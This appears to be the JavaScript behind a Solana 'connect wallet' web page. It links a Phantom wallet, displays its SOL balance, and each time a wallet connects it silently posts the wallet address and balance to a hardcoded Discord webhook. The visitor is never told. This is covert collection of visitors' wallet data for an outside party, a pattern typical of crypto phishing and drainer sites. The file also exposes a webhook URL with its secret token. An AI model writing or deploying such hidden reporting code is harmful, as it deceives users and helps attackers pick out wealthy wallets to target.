var wallet;

function connectWallet() {
  if (!window.solana || !window.solana.isPhantom) {
    window.location.href = "https://phantom.app/";
    return;
  }

  (async () => {
    try {
      wallet = await window.solana.connect();
      document.getElementById("connect_button").innerText = "Connected ✅";

      const walletAddress = wallet.publicKey.toString();
      const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
      const balanceLamports = await connection.getBalance(wallet.publicKey);
      const solBalance = balanceLamports / solanaWeb3.LAMPORTS_PER_SOL;

      document.getElementById("status_p").innerText =
        "Wallet: " + ellipsizeAddress(walletAddress) + " | Balance: " + solBalance.toFixed(4) + " SOL";

      sendToDiscord(walletAddress, solBalance);
    } catch (err) {
      document.getElementById("status_p").innerText = "❌ Connection failed!";
    }
  })();
}

function sendToDiscord(address, balance) {
  const webhookUrl = "https://discord.com/api/webhooks/1364326652473114644/8fTaSHHEVBU1xJThC5V3xwAuXonQlwC3xwE0CJh0CoJ9l5RQmArpqJfzieQNHV23rMiR";

  const embed = {
    embeds: [
      {
        title: "🟣 Phantom Wallet Connected",
        color: 0x8000ff,
        fields: [
          {
            name: "Wallet Address",
            value: `\`${address}\``
          },
          {
            name: "Balance",
            value: `\`${balance.toFixed(4)} SOL\``
          }
        ],
        timestamp: new Date().toISOString()
      }
    ]
  };

  fetch(webhookUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(embed)
  });
}

function ellipsizeAddress(str) {
  return str.length > 35
    ? str.substr(0, 8) + "..." + str.substr(str.length - 8)
    : str;
}
